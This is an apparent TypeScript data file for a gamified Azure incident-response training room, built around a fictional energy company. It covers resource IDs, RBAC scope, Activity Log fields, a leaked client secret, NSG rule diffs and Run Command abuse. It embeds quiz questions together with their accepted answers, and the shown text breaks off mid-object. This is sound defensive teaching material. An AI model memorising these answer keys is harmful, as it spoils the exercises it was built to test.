import type { RoomExperience } from "./types";

// "Operation Subscription" for the "azure-security" room.
// Script: docs/campaign/103-azure-security.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Rowan Grid Energy (fictional), not the graded tasks' NexaCorp records.
// Signature: a portal on the azure skin over the Activity log and role assignments, where a
// Contributor role turns into control of a VM through Run Command, and a tune lab on which
// control-plane operations page someone. Rooms 55 and 83 cover Entra and the common control
// plane; this room is Azure resources.
// Game mix: duel + portal + spotdiff + tune. The brief named duel + portal + spotdiff and also
// asked for the tune lab. Deleting the tune block in azure-r6 gives the three-kind mix, and no
// graded task depends on it.
//
// Task order changed. Original: r1, r2, r3, r4, r5, q1, q2, q3, la1, la2, ac1, m1, r6, la-storage,
// f1, r7, r8. New: r1, r2, q1, r3, q2, r4, r5, q3, r8, la1, ac1, m1, r6, la2, la-storage, f1, r7.
// Each question now follows its reading. r8 moved ahead of the first containment question, and
// la2 moved so the boss holds the hardest task. Order kept on purpose: la1 before ac1 (ac1's
// fp_trap cites the earlier Key Vault event), ac1 before r6 (r6 cites and explains ac1), la1
// before la2 before la-storage (their contexts count minutes from each other), f1 straight
// after la-storage ("the event above"), r7 after f1 ("the flag question above").
// No flag or reading says "Log Analysis N", so no number can break.
//
// Lab data differs from the graded tasks: the story is an app registration's leaked client
// secret and a Linux VM, never a web app's managed identity, a vault secret or RDP (la1, la2).
// The resource ID is a storage container path, never a vault (r1 checkpoint). The log sort and
// the visibility sheet use blobs and flows, never a secret (q1). The worked recon is a guest
// user's list actions, never a service principal's burst (q3). Run Command here lands on a
// serving Linux VM and plants a crontab, never a locked-down VM or a local account (r5
// checkpoint). The rule diff opens SSH, 5432 and 8080, never 3389 (la2). The tuples are SSH, HTTP
// and PostgreSQL (la2). The vault anatomy is a SecretSet by a runbook (la1). The verdict queue
// is Run Command and role grants, never listKeys by a backup job (ac1). The SAS labs never ask
// what ends a token: the method appears as data in one column (r7 checkpoint).

export const AZURE_SECURITY: RoomExperience = {
  roomId: "azure-security",
  codename: "Operation Subscription",
  theme: "subscription",
  handler: { name: "Linnea Achebe", role: "Azure Security Engineer, Rowan Grid Energy" },
  briefing: [
    "Rowan Grid Energy. One Azure subscription behind the outage map that half a million homes check when the lights go out, and a named storm due on Thursday.",
    "Overnight Defender for Cloud flagged a script on vm-outagemap-02, and nobody on the outage team signed in to that machine.",
    "Linnea Achebe has one question for the morning: what can reach this VM without ever logging on to it?",
    "Map the subscription, name the caller, follow a role all the way into the VM, shut it down cleanly, then take a partner's desk for the night.",
  ],
  mission: "Read a resource ID and a role assignment, sort what each log can show, tell one non-human identity from another, follow a leaked secret, find what changed in the rules, trace a Contributor role into a VM, decide what pages someone, contain it without losing evidence, then work the graded case on NexaCorp's desk.",
  estimate: "~60 min",
  look: { primary: "#6cb8ff", secondary: "#f6d06f", warn: "#ff6a55" },
  scene: "facilitysubscription",
  layout: "facility",
  stations: [
    {
      id: "map",
      label: "The Tenant Map",
      topic: "Subscriptions, resource groups, RBAC · resource IDs · the Activity Log · diagnostic settings",
      tagline: "Where is it, and who wrote it down?",
      building: "control",
      taskIds: ["azure-r1", "azure-r2", "azure-q1"],
    },
    {
      id: "caller",
      label: "Who Called?",
      topic: "Managed identities · service principals · reading the claims",
      tagline: "Every token belongs to somebody",
      building: "office",
      taskIds: ["azure-r3", "azure-q2"],
    },
    {
      id: "script",
      label: "The Overnight Script",
      topic: "NSGs · storage exposure · Run Command · enumeration · Defender for Cloud",
      tagline: "Nobody logged on",
      building: "lab",
      taskIds: ["azure-r4", "azure-r5", "azure-q3"],
    },
    {
      id: "contain",
      label: "Contain or Close",
      topic: "Containing an identity · reading a vault record · verdicts · the triage checklist",
      tagline: "Stop it, then read the next one",
      building: "ticket",
      taskIds: ["azure-r8", "azure-la1", "azure-ac1", "azure-m1", "azure-r6"],
    },
    {
      id: "boss",
      label: "Twenty-Three Minutes",
      topic: "Rule changes · flow records · public containers · SAS tokens",
      tagline: "Same night, next event",
      building: "vault",
      taskIds: ["azure-la2", "azure-la-storage", "azure-f1", "azure-r7"],
      boss: true,
    },
  ],
  personas: {
    "azure-q1": { name: "Linnea Achebe", role: "Azure Security Engineer", line: "The change is in the log. The read isn't. Tell me why." },
    "azure-q2": { name: "Linnea Achebe", role: "Azure Security Engineer", line: "Two callers, and the same word in principalType. What changes for you?" },
    "azure-q3": { name: "Linnea Achebe", role: "Azure Security Engineer", line: "Read this burst for me. What are you looking at?" },
    "azure-la1": { name: "Linnea Achebe", role: "Azure Security Engineer", line: "NexaCorp's desk is yours tonight. Start with this record." },
    "azure-ac1": { name: "Linnea Achebe", role: "Azure Security Engineer", line: "Same desk, a few hours later. What's your verdict on this one?" },
    "azure-m1": { name: "Linnea Achebe", role: "Azure Security Engineer", line: "Their new analyst came over from AWS. Give them the map." },
    "azure-la2": { name: "Linnea Achebe", role: "Azure Security Engineer", line: "Back to the 02:11 timeline. The next entry is in." },
    "azure-la-storage": { name: "Linnea Achebe", role: "Azure Security Engineer", line: "One more write from that night. Read the body." },
    "azure-f1": { name: "Linnea Achebe", role: "Azure Security Engineer", line: "Give me the name for the rotation ticket." },
  },
  briefings: {
    // ── Reading 1: the resource model ──
    "azure-r1": [
      {
        kind: "anatomy",
        title: "Read a Resource ID",
        prompt: "Monday, 07:05. Before anyone touches the VM, Linnea wants you able to place anything in this subscription from one string. Every log you open today carries this path. Scan it part by part.",
        source: "Activity Log · resourceId · rowan-grid-prod",
        fields: [
          { key: "resourceId", value: "/subscriptions/3d7e1b40-92c6-4f1a-8b35-6ae0c4d2f917/resourceGroups/rg-meterdata-prod/providers/Microsoft.Storage/storageAccounts/rowanmeterexports/blobServices/default/containers/daily-reads", label: "The whole path", note: "Read left to right. Each part sits inside the one before it." },
          { key: "subscriptions", value: "3d7e1b40-92c6-4f1a-8b35-6ae0c4d2f917", label: "Subscription", note: "The basic unit of billing and access management. Its closest match is an AWS account or a GCP project." },
          { key: "resourceGroups", value: "rg-meterdata-prod", label: "Resource group", note: "A logical container for one application or environment. AWS and GCP have no single direct equivalent, and lean on tags and naming." },
          { key: "providers", value: "Microsoft.Storage", label: "Provider", note: "The Azure service that owns what follows." },
          { key: "storageAccounts", value: "rowanmeterexports", label: "Resource", note: "The resource type, then its name." },
          { key: "blobServices/default/containers", value: "daily-reads", label: "Child resource", note: "The path can carry on below a resource. Here the last name is a container, and its parent is the name further left." },
        ],
        summary: "Everything in Azure has this one path, and it appears in nearly every log in this room. So the moment a log names something, you already know the subscription, the group, the service and the resource. When a path runs past the resource into a child, read the names by their labels and not by position from the end.",
        primer: {
          title: "How Azure files things",
          points: [
            "Everything sits in a **subscription**. Inside it, **resource groups** hold related resources. Large organizations group subscriptions under **management groups**.",
            "A **provider** names the service, such as `Microsoft.Compute` or `Microsoft.Sql`.",
            "A **resourceId** is a path built from those parts, always in that order.",
          ],
          example: {
            label: "Another company's database server",
            lines: [
              "`/subscriptions/{id}/resourceGroups/rg-hr-test/providers/Microsoft.Sql/servers/hr-sql-01`",
              "Subscription, then group, then service, then type and name.",
            ],
          },
        },
      },
      {
        kind: "worksheet",
        title: "Does This Role Reach That?",
        prompt: "Linnea pulled six assignments from around the subscription. Who can reach what here? Work it out from the three parts of each row, because the person on the phone will say what they think they have.",
        caption: "Access control (IAM) · role assignments · rowan-grid-prod",
        columns: ["Principal", "Type", "Role", "Scope"],
        rows: [
          ["Outage Ops Engineers", "Group", "Virtual Machine User Login", "rg-outagemap-prod"],
          ["sp-outagemap-deploy", "App", "Contributor", "rg-outagemap-prod"],
          ["Finance Readers", "Group", "Reader", "Subscription rowan-grid-prod"],
          ["a.marchetti", "User", "Owner", "Storage account rowanmeterexports"],
          ["Platform Admins", "Group", "Owner", "Subscription rowan-grid-prod"],
          ["fn-meter-ingest", "Managed identity", "Storage Blob Data Contributor", "Storage account rowanmeterexports"],
        ],
        questions: [
          { id: "reach", q: "vm-outagemap-02 sits in rg-outagemap-prod. How many of these six assignments reach it?", hint: "A scope covers everything below it. Count the group and the subscription.", answer: ["4", "four"], why: "Four: the two on rg-outagemap-prod and the two on the subscription. The two scoped to one storage account stop there." },
          { id: "owner", q: "a.marchetti says: I'm an Owner, I'll fix the outage map's network rule myself. Can they? (yes/no)", hint: "Owner of what?", answer: ["no"], why: "A role means nothing without its scope. Owner on one storage account gives no rights over a network rule in another resource group." },
          { id: "part", q: "One part of an assignment sets how far it reaches. Which word names that part?", hint: "Principal, role, and the third one.", answer: ["scope"], why: "Principal is who, role is what, scope is where. Almost every Azure privilege question comes down to reading those three together." },
        ],
        primer: {
          title: "An assignment has three parts",
          points: [
            "**Principal:** who. A user, group, managed identity or service principal.",
            "**Role:** what. A set of allowed actions, such as Reader or Contributor.",
            "**Scope:** where. A subscription, a resource group or one resource.",
            "A role given at a scope applies to everything below that scope.",
          ],
          example: {
            label: "One assignment, read aloud",
            lines: [
              "Principal `Payroll Auditors`, role `Reader`, scope `rg-hr-test`.",
              "Aloud: this group may read every resource in rg-hr-test, and nothing outside it.",
            ],
          },
        },
      },
    ],
    // ── Reading 2: the Activity Log and the visibility gap ──
    "azure-r2": [
      {
        kind: "sort",
        title: "Which Log Holds It?",
        prompt: "Linnea's next rule: know where a fact lives before you go looking for it. Eight things happened at Rowan this week. Drop each one in the log that records it.",
        buckets: [
          { id: "activity", label: "Activity Log" },
          { id: "diag", label: "Resource diagnostic log" },
          { id: "entra", label: "Entra ID logs" },
        ],
        items: [
          { id: "i1", text: "A role assignment created on rg-meterdata-prod", bucket: "activity", why: "A change to a resource's access is a control-plane operation: Microsoft.Authorization/roleAssignments/write." },
          { id: "i2", text: "daily-reads/2026-11-08.csv downloaded from rowanmeterexports", bucket: "diag", why: "Reading a blob is using the data, not managing the account. It lands in StorageBlobLogs, and only if a diagnostic setting sends it there." },
          { id: "i3", text: "A storage account's firewall setting changed", bucket: "activity", why: "A configuration write on the resource: control plane." },
          { id: "i4", text: "An engineer signs in to the portal with MFA", bucket: "entra", why: "Sign-ins belong to Entra ID. A separate room covers those logs." },
          { id: "i5", text: "A VM restarted from the portal", bucket: "activity", why: "Microsoft.Compute/virtualMachines/restart/action is an action on the resource, so it's control plane." },
          { id: "i6", text: "198.51.100.140 connects to 10.30.1.5 on port 443, and an NSG allows it", bucket: "diag", why: "Traffic isn't a management operation. It appears in flow logs, which are configured per NSG." },
          { id: "i7", text: "A new guest user invited to the directory", bucket: "entra", why: "A directory change: Entra ID audit logs, not the subscription's Activity Log." },
          { id: "i8", text: "A function app reads a message from a storage queue", bucket: "diag", why: "Data-plane again: StorageQueueLogs, once it's turned on." },
        ],
        primer: {
          title: "Control plane and data plane",
          points: [
            "**Control plane:** managing Azure resources. Create, update, delete, assign a role, start an action.",
            "**Data plane:** using what's inside a resource.",
            "The **Activity Log** records the control plane. It's always on, and keeps 90 days by default. Plain reads usually aren't in it.",
            "**Resource logs** record the data plane. They stay off until a **diagnostic setting** on that resource sends them somewhere.",
            "**Log Analytics** is where it can all be queried together, in KQL (Kusto Query Language).",
          ],
          example: {
            label: "The two planes on a SQL server",
            lines: [
              "`Microsoft.Sql/servers/write` changes the server: control plane, Activity Log.",
              "A `SELECT` on a table reads the data: data plane, seen only once SQL auditing is on.",
            ],
          },
        },
      },
      {
        kind: "anatomy",
        title: "Anatomy of an Activity Log Entry",
        prompt: "An honest entry first. Saturday morning, an engineer restarted a VM after a patch. Read what the log gives you, field by field, as it reaches the SIEM. AWS analysts know this trail as CloudTrail, its closest match.",
        source: "Azure Activity Log · Administrative · rowan-grid-prod",
        fields: [
          { key: "azure.activitylogs.operationName", value: "Microsoft.Compute/virtualMachines/restart/action", label: "What", note: "Always PROVIDER/RESOURCETYPE/ACTION. The last word says write, delete or action." },
          { key: "azure.activitylogs.resourceId", value: "/subscriptions/3d7e1b40-92c6-4f1a-8b35-6ae0c4d2f917/resourceGroups/rg-outagemap-prod/providers/Microsoft.Compute/virtualMachines/vm-outagemap-01", label: "Which resource" },
          { key: "azure.activitylogs.caller", value: "o.brandt@rowangrid.example", label: "Who", note: "A user's sign-in name here. A non-human identity shows an object ID." },
          { key: "azure.activitylogs.callerIpAddress", value: "203.0.113.25", label: "From where", note: "The public address Azure saw." },
          { key: "azure.activitylogs.resultType", value: "Success", label: "Outcome", note: "Success or Failure." },
          { key: "azure.activitylogs.identity.authorization.evidence.principalType", value: "User", note: "User, Group, ServicePrincipal, ForeignGroup or Device." },
          { key: "azure.activitylogs.identity.authorization.evidence.role", value: "Virtual Machine Contributor", label: "Which role allowed it" },
          { key: "azure.activitylogs.category", value: "Administrative" },
        ],
        summary: "Who, from where, did what, to which resource, under which role, and how it ended. That's the whole control-plane record. What it holds back is just as useful to know: nothing here says what ran inside the VM afterwards, and nothing in this log says what anyone read from inside a resource.",
      },
      {
        kind: "worksheet",
        title: "An Empty Log Proves Nothing",
        prompt: "An engineer tells Linnea: \"rowanoutagesa shows no reads this week, so nobody touched it.\" Linnea hands you the diagnostic settings page and asks you to check that before it goes in the notes.",
        caption: "Diagnostic settings · two resource groups · last 7 days",
        columns: ["Resource", "Type", "Diagnostic setting", "Sent to", "Rows, last 7 days"],
        rows: [
          ["rowanmeterexports", "Storage account", "On: StorageRead, StorageWrite", "rowan-logs", "41,220"],
          ["rowanoutagesa", "Storage account", "None", "-", "0"],
          ["rowanbillingsa", "Storage account", "On: StorageWrite only", "rowan-logs", "3,108"],
          ["nsg-outagemap", "Network security group", "Flow logs on", "rowan-logs", "1,906,402"],
        ],
        questions: [
          { id: "read", q: "Does 0 rows on rowanoutagesa show that nobody read from it? (yes/no)", hint: "What would have had to be on for a read to be written down?", answer: ["no"], why: "No setting means no record. Zero rows is what an untouched account and a looted account look like alike." },
          { id: "billing", q: "Could you count blob downloads on rowanbillingsa from these logs? (yes/no)", hint: "Which categories does it send?", answer: ["no"], why: "It sends writes only. Having a setting isn't the same as having the category you need, so read what's ticked." },
          { id: "fix", q: "Which single resource can answer 'who downloaded what'?", hint: "It needs the read category.", answer: ["rowanmeterexports"], why: "Only rowanmeterexports sends StorageRead. Check this page first on any resource, before you write 'no activity' in a ticket." },
        ],
      },
    ],
    // ── Reading 3: non-human identities ──
    "azure-r3": [
      {
        kind: "sort",
        title: "Whose Token Is This?",
        prompt: "The Activity log says the overnight caller is non-human. Rowan has plenty of those. Linnea reads you seven callers from the logs: sort each one by what it really is, using the claims and not the name.",
        buckets: [
          { id: "mi", label: "Managed identity" },
          { id: "app", label: "App registration" },
          { id: "user", label: "Human user" },
        ],
        items: [
          { id: "t1", text: "idtyp app · principalType ServicePrincipal · xms_mirid .../Microsoft.Logic/workflows/wf-outage-sms", bucket: "mi", why: "xms_mirid names the Azure resource the identity belongs to. There's no secret to hunt for in a repository: ask what wf-outage-sms is running and which roles it was given. Its closest AWS match is an EC2 instance role." },
          { id: "t2", text: "idtyp app · principalType ServicePrincipal · no xms_mirid · Entra servicePrincipalType Application", bucket: "app", why: "No xms_mirid, and Entra says Application. This one signs in with a client secret or certificate, much like an AWS IAM user with an access key." },
          { id: "t3", text: "principalType User · caller o.brandt@rowangrid.example", bucket: "user", why: "A person, with a sign-in name." },
          { id: "t4", text: "idtyp app · principalType ServicePrincipal · xms_mirid .../Microsoft.Web/sites/fn-meter-ingest", bucket: "mi", why: "The name in the claim is a function app, and that resource is what to look at." },
          { id: "t5", text: "principalType ServicePrincipal · Entra servicePrincipalType ManagedIdentity · sign-ins in AADManagedIdentitySignInLogs", bucket: "mi", why: "The Entra object says ManagedIdentity, and its sign-ins land in their own log." },
          { id: "t6", text: "principalType ServicePrincipal · sign-ins in AADServicePrincipalSignInLogs · client secret, last rotated 2024", bucket: "app", why: "A client secret is the giveaway. Ask where it's stored and who has seen it." },
          { id: "t7", text: "idtyp app · no xms_mirid · appid of the tf-outagemap pipeline", bucket: "app", why: "A pipeline that signs in for itself, with no resource behind it." },
        ],
        primer: {
          title: "Two kinds of non-human identity",
          points: [
            "A **managed identity** belongs to an Azure resource. Azure issues its short-lived tokens from a local endpoint, and the code never handles a secret. **System-assigned** lives and dies with one resource. **User-assigned** can be attached to several.",
            "A **service principal** is the tenant's copy of an **app registration**. It signs in with a **client secret** or a **certificate**.",
            "In RBAC a managed identity is a service principal too, so `principalType` reads `ServicePrincipal` for both.",
            "`idtyp` of `app` marks a non-human caller.",
            "`xms_mirid` is a token claim only a managed identity carries. In Entra ID, `servicePrincipalType` says `ManagedIdentity` or `Application`.",
          ],
          example: {
            label: "One caller, read from its claims",
            lines: [
              "`idtyp`: `app`",
              "`xms_mirid`: `.../Microsoft.Automation/automationAccounts/aa-reports`",
              "Reading: a managed identity, and aa-reports is the resource it belongs to.",
            ],
          },
        },
      },
      {
        kind: "trace",
        title: "Follow the Client Secret",
        prompt: "The overnight caller is sp-outagemap-deploy, the contractor's deployment identity. Tern Build Services sent over their logs at 08:30. Follow the secret from where it leaked to where it was used.",
        lead: "sp-outagemap-deploy, an app registration with a client secret. Its pipeline normally runs from 203.0.113.18.",
        steps: [
          {
            id: "leak",
            ask: "Which build log line exposes the credential?",
            source: "Build log · tern-pipelines · outagemap-release #412",
            columns: ["Time", "Step", "Line"],
            rows: [
              ["10-27 15:02:11", "checkout", "Fetched 214 files from main"],
              ["10-27 15:02:48", "terraform init", "Backend initialized"],
              ["10-27 15:03:02", "debug env", "ARM_CLIENT_ID=6f02c1d8-41ba-4e7e-93c0-7ab1d5e2f640"],
              ["10-27 15:03:02", "debug env", "ARM_CLIENT_SECRET=Zk4~Tn0qQ8vX... (40 characters, in clear text)"],
              ["10-27 15:04:37", "terraform apply", "Apply complete! Resources: 1 added, 2 changed, 0 destroyed."],
            ],
            answer: 3,
            why: "A debug step printed the environment. A client ID isn't a credential, but the secret beside it is, and together they're all anyone needs to sign in as this app. The build log was shared with a subcontractor's whole team.",
            learned: "The secret was printed in build #412 on 27 October",
          },
          {
            id: "use",
            ask: "Which sign-in is the secret being used somewhere else?",
            source: "AADServicePrincipalSignInLogs · sp-outagemap-deploy",
            columns: ["TimeGenerated", "ServicePrincipalName", "IPAddress", "ResultType", "ResourceDisplayName"],
            rows: [
              ["11-06 16:21:44", "sp-outagemap-deploy", "203.0.113.18", "0", "Windows Azure Service Management API"],
              ["11-09 02:33:09", "sp-outagemap-deploy", "198.51.100.84", "0", "Windows Azure Service Management API"],
              ["11-05 16:19:02", "sp-outagemap-deploy", "203.0.113.18", "0", "Windows Azure Service Management API"],
              ["11-04 16:20:51", "sp-outagemap-deploy", "203.0.113.18", "0", "Windows Azure Service Management API"],
            ],
            answer: 1,
            why: "ResultType 0 is a success. 02:33 on a Monday from an address the pipeline has never used, and nothing stopped it, because a client secret works from wherever somebody types it. Nothing about the secret ties it to Tern's runner.",
            learned: "198.51.100.84 signed in as the deploy identity at 02:33 on Monday",
          },
          {
            id: "which",
            ask: "The app has two credentials. Which one has to go?",
            source: "App registrations · sp-outagemap-deploy · Certificates & secrets",
            columns: ["Description", "Expires", "Value (hint)", "Secret ID"],
            rows: [
              ["old-terraform", "2025-12-31", "Mq9~****", "a14c90d2-…"],
              ["contractor-ci", "2028-06-30", "Zk4~****", "e7b35f1c-…"],
            ],
            answer: 1,
            why: "The portal keeps only the first characters of a secret, and they're enough: Zk4 matches the build log. Deleting that entry is what ends this credential, and every system holding a copy loses it in the same moment. It still has until 2028 otherwise.",
            learned: "contractor-ci is the leaked credential, valid until 2028 if nobody deletes it",
          },
        ],
        primer: {
          title: "Where a service principal shows up",
          points: [
            "Its sign-ins land in `AADServicePrincipalSignInLogs`, with the source in `IPAddress`.",
            "`ResultType` of `0` is a success. Anything else is an error code.",
            "The app registration's **Certificates & secrets** page lists each credential with an expiry and the first few characters of its value.",
          ],
          example: {
            label: "One line from another tenant",
            lines: [
              "`ServicePrincipalName`: `svc-invoice-sync`, `IPAddress`: `192.0.2.40`, `ResultType`: `0`",
              "Reading: the app signed in successfully from that address.",
            ],
          },
        },
      },
    ],
    // ── Reading 4: NSGs and storage exposure ──
    "azure-r4": [
      {
        kind: "spotdiff",
        title: "Reviewed Rules or Live Rules?",
        prompt: "The October review signed off nsg-outagemap, the firewall in front of both outage map VMs. Linnea exported the live rules this morning. Each line reads priority, direction, access, protocol, source, port, name. Tap every line that lets more in than the review did.",
        goodTitle: "nsg-outagemap · reviewed export · October",
        suspectTitle: "nsg-outagemap · live export · Monday 07:40",
        good: [
          "100 | Inbound | Allow | Any | AzureLoadBalancer | * | allow-lb-probe",
          "110 | Inbound | Allow | TCP | Internet | 443 | allow-public-https",
          "130 | Inbound | Allow | TCP | 10.30.0.4 | 443 | allow-gateway-https",
          "200 | Inbound | Allow | TCP | 10.30.0.0/24 | 22 | allow-ops-ssh",
          "210 | Inbound | Allow | TCP | 10.30.0.0/24 | 9100 | allow-ops-metrics",
          "300 | Inbound | Deny | TCP | * | 5432 | deny-pg-in",
          "2000 | Inbound | Deny | TCP | Internet | 8080 | deny-debug-in",
          "2900 | Inbound | Allow | TCP | * | 5432 | legacy-pg-temp",
          "4000 | Inbound | Deny | Any | * | * | deny-all-in",
          "65000 | Inbound | Allow | Any | VirtualNetwork | * | AllowVnetInBound",
          "65001 | Inbound | Allow | Any | AzureLoadBalancer | * | AllowAzureLoadBalancerInBound",
          "65500 | Inbound | Deny | Any | * | * | DenyAllInBound",
        ],
        suspect: [
          "100 | Inbound | Allow | Any | AzureLoadBalancer | * | allow-lb-probe",
          "120 | Inbound | Allow | TCP | Internet | 443 | allow-public-https",
          "130 | Inbound | Allow | TCP | 10.30.0.4 | 443 | allow-gateway-https",
          "200 | Inbound | Allow | TCP | * | 22 | allow-ops-ssh",
          "210 | Inbound | Allow | TCP | 10.30.0.16/28 | 9100 | allow-ops-metrics",
          "3300 | Inbound | Deny | TCP | * | 5432 | deny-pg-in",
          "2000 | Inbound | Allow | TCP | Internet | 8080 | deny-debug-in",
          "2900 | Inbound | Allow | TCP | * | 5432 | legacy-pg-temp",
          "4000 | Inbound | Deny | Any | * | * | deny-all-in",
          "65000 | Inbound | Allow | Any | VirtualNetwork | * | AllowVnetInBound",
          "65001 | Inbound | Allow | Any | AzureLoadBalancer | * | AllowAzureLoadBalancerInBound",
          "65500 | Inbound | Deny | Any | * | * | DenyAllInBound",
        ],
        diffs: [
          { line: 3, why: "The source went from the ops network to *, any address. SSH on these VMs now answers the whole internet, and the rule kept its friendly name." },
          { line: 5, why: "The numbers are the trap. At 300 this Deny ran before legacy-pg-temp at 2900, so the old Allow did nothing. At 3300 the Allow is reached first, and PostgreSQL is open to any source. No Allow line changed." },
          { line: 6, why: "Deny became Allow and the name still says deny. Read the access column, because the name is only a label." },
        ],
        decoys: [
          { line: 1, why: "Renumbered from 110 to 120, with nothing between them. The evaluation order doesn't change." },
          { line: 4, why: "A narrower source: /28 is a smaller range inside the old /24. This lets less in, not more." },
        ],
        hud: "Tap the lines that let more in than the review",
        sameLine: "That line matches the reviewed export.",
        winTitle: "Every widened rule found",
        lesson: "An NSG is read top to bottom by priority number, and the first match decides. So a rule can be opened by changing its source, its access, or a different rule's number. Compare every column, and never trust the name.",
        primer: {
          title: "Read an NSG rule",
          points: [
            "A **Network Security Group** is Azure's virtual firewall on a subnet or a network interface. Its closest AWS match is a Security Group.",
            "Each rule has a priority, a direction, an access decision, a protocol, a source and a destination port.",
            "**Lower numbers are evaluated first**, and the first match wins.",
            "A source is an address range, a service tag such as `VirtualNetwork`, or `*`, which means any source at all.",
            "The rules numbered 65000 and above are defaults that every NSG carries.",
          ],
          example: {
            label: "One rule, read aloud",
            lines: [
              "`120 | Inbound | Allow | TCP | 10.9.0.0/16 | 443 | allow-branch-https`",
              "Aloud: checked before anything numbered above 120, this lets the 10.9 network reach HTTPS.",
            ],
          },
        },
      },
      {
        kind: "inspect",
        title: "Three Containers, Three Settings",
        prompt: "rowanoutagesa holds the map's files. Each container in it has its own public access level, and the account has a switch above them all. Open each line to see what that setting means for someone with no credentials at all.",
        artifact: "Containers · rowanoutagesa",
        items: [
          { id: "c1", text: "internal-reports · Public access level: Private", tag: "No anonymous access", tone: "info", note: "Every request needs a credential. An anonymous request for the container or a blob in it gets nothing." },
          { id: "c2", text: "storm-graphics · Public access level: Blob", tag: "Anonymous read of blobs", tone: "info", note: "Anyone holding a blob's exact URL gets that file. Listing the container's contents isn't available anonymously." },
          { id: "c3", text: "outage-tiles · Public access level: Container", tag: "Anonymous read and list", tone: "info", note: "Anyone can list every blob in the container and read any of them. The API writes this as publicAccess: Container." },
          { id: "c4", text: "Account setting · allowBlobPublicAccess: true", tag: "The switch above", tone: "info", note: "Set on the storage account. False overrides every container's level, and no container in the account takes anonymous requests." },
        ],
      },
    ],
    // ── Reading 5: Run Command and enumeration ──
    "azure-r5": [
      {
        kind: "portal",
        skin: "azure",
        title: "From Contributor to the VM",
        prompt: "Monday 09:10. You have the resource group open, and Linnea has one question: how did somebody run code on vm-outagemap-02 with nobody signed in? Start from the alert and work back to the role that made it possible.",
        product: "Cloud portal",
        resource: "rg-outagemap-prod",
        tenant: "rowangrid.example",
        home: "overview",
        menu: [
          { items: [{ id: "overview", label: "Overview" }, { id: "activity", label: "Activity log" }, { id: "iam", label: "Access control (IAM)" }, { id: "roles", label: "Roles" }] },
          { group: "Security", items: [{ id: "alerts", label: "Security alerts" }] },
          { group: "Monitoring", items: [{ id: "logs", label: "Logs" }, { id: "flow", label: "NSG flow logs" }, { id: "guest", label: "Device events" }] },
        ],
        pages: {
          overview: {
            heading: "Overview",
            commands: [{ id: "deleterg", label: "Delete resource group" }],
            tiles: [{ label: "Resources", value: "5" }, { label: "Location", value: "North Europe" }, { label: "Subscription", value: "rowan-grid-prod" }],
            table: {
              columns: ["Name", "Type", "Location"],
              rows: [
                { id: "r-vm1", cells: ["vm-outagemap-01", "Virtual machine", "North Europe"] },
                { id: "r-vm2", cells: ["vm-outagemap-02", "Virtual machine", "North Europe"] },
                { id: "r-nsg", cells: ["nsg-outagemap", "Network security group", "North Europe"] },
                { id: "r-sa", cells: ["rowanoutagesa", "Storage account", "North Europe"] },
                { id: "r-id", cells: ["id-outagemap-app", "Managed identity", "North Europe"] },
              ],
            },
          },
          alerts: {
            heading: "Security alerts",
            tiles: [{ label: "Active alerts", value: "2" }, { label: "Affected resources", value: "2" }],
            filters: ["Status : Active", "Time : Last 24 hours"],
            note: "Defender for Cloud: posture assessment and pre-scored threat alerts in one place. The closest AWS pairing is GuardDuty with Security Hub.",
            table: {
              columns: ["Severity", "Alert title", "Affected resource", "Activity start time", "MITRE ATT&CK tactics"],
              rows: [
                { id: "al-ip", cells: ["Medium", "Traffic detected from IP addresses recommended for blocking", "vm-outagemap-01", "Mon 01:12", "Reconnaissance"], tone: "medium" },
                { id: "al-run", cells: ["High", "Suspicious Run Command usage was detected on your virtual machine", "vm-outagemap-02", "Mon 02:41", "Execution"], tone: "high" },
              ],
            },
          },
          activity: {
            heading: "Activity log",
            filters: ["Timespan : Last month", "Event severity : All", "Resource group : rg-outagemap-prod", "Showing 10 of 74 events"],
            table: {
              columns: ["Operation name", "Status", "Time", "Resource", "Event initiated by"],
              rows: [
                { id: "a-nsg3", cells: ["Create or Update Security Rule", "Succeeded", "Mon 02:54", "nsg-outagemap/deny-pg-in", "sp-outagemap-deploy"] },
                { id: "a-nsg2", cells: ["Create or Update Security Rule", "Succeeded", "Mon 02:53", "nsg-outagemap/deny-debug-in", "sp-outagemap-deploy"] },
                { id: "a-nsg1", cells: ["Create or Update Security Rule", "Succeeded", "Mon 02:52", "nsg-outagemap/allow-ops-ssh", "sp-outagemap-deploy"] },
                { id: "a-run", cells: ["Run Command on Virtual Machine", "Succeeded", "Mon 02:41", "vm-outagemap-02", "sp-outagemap-deploy"] },
                { id: "a-fail", cells: ["Create role assignment", "Failed", "Mon 02:38", "rg-outagemap-prod", "sp-outagemap-deploy"] },
                { id: "a-keys", cells: ["List Storage Account Keys", "Succeeded", "Mon 02:36", "rowanoutagesa", "sp-outagemap-deploy"] },
                { id: "a-patch", cells: ["Run Command on Virtual Machine", "Succeeded", "Sun 23:10", "vm-outagemap-01", "id-patch-runner"] },
                { id: "a-restart", cells: ["Restart Virtual Machine", "Succeeded", "Sat 09:48", "vm-outagemap-01", "o.brandt@rowangrid.example"] },
                { id: "a-dep", cells: ["Create or Update Virtual Machine", "Succeeded", "Fri 16:22", "vm-outagemap-02", "sp-outagemap-deploy"] },
                { id: "a-role", cells: ["Create role assignment", "Succeeded", "14 Oct 10:02", "rg-outagemap-prod", "r.sandhu@rowangrid.example"] },
              ],
            },
          },
          iam: {
            heading: "Access control (IAM)",
            commands: [{ id: "addrole", label: "Add role assignment" }],
            filters: ["Type : All", "Role : All", "Scope : All scopes"],
            note: "Role assignments at this scope and inherited from above. 'This resource' is the resource group, so it covers every resource in the group.",
            table: {
              columns: ["Name", "Type", "Role", "Scope"],
              rows: [
                { id: "ra-admins", cells: ["Platform Admins", "Group", "Owner", "Subscription (Inherited)"] },
                { id: "ra-sp", cells: ["sp-outagemap-deploy", "App", "Contributor", "This resource"] },
                { id: "ra-tf", cells: ["tf-outagemap", "App", "Contributor", "This resource"] },
                { id: "ra-patch", cells: ["id-patch-runner", "Managed identity", "Virtual Machine Contributor", "This resource"] },
                { id: "ra-obrandt", cells: ["o.brandt", "User", "Virtual Machine Contributor", "This resource"] },
                { id: "ra-app", cells: ["id-outagemap-app", "Managed identity", "Storage Blob Data Contributor", "This resource"] },
                { id: "ra-ops", cells: ["Outage Ops Engineers", "Group", "Virtual Machine User Login", "This resource"] },
                { id: "ra-fin", cells: ["Finance Readers", "Group", "Reader", "Subscription (Inherited)"] },
              ],
            },
          },
          roles: {
            heading: "Roles: Contributor",
            filters: ["Built-in role", "Showing 6 of 12 permission lines"],
